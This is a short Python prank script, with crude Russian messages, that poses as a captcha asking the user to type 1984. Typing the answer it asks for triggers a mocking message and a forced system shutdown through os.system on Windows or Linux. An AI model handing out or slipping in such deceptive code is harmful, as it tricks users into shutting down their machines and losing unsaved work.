import os
import time
import platform

counter = 0
def shutdown_computer():
    os_name = platform.system()
    if os_name == "Windows":
        os.system("shutdown /s /t 1")
    elif os_name == "Linux":
        os.system("shutdown -h now")
    else:
        print("Блять. Если у тебя мак, или какая-то другая юникс-подобная шмаль - то иди нахуй(")

while True:
    print("Введи капчу - | 1984 |")
    vvod = input("Твой ввод: ")
    if vvod.strip().casefold() == "1984".casefold():
        print("АХАХААХХ ЛОХ мут нахуй XD")
        time.sleep(5)
        shutdown_computer()
    else:
        counter += 1
        print(f"Текущие попытки решения капчи: {counter}")
        if vvod.strip() == "4891":
            print("Нихуясе =0 120IQ мув")
            counter += 991
            print(f"Твое кол-во попыток теперь: {counter}")
        if counter == 1984:
            print("Не. Ну ты кнч умный. ТЫ ПРОШЁЛ КАПЧУ =D")
            time.sleep(2)
            break
        time.sleep(1.5)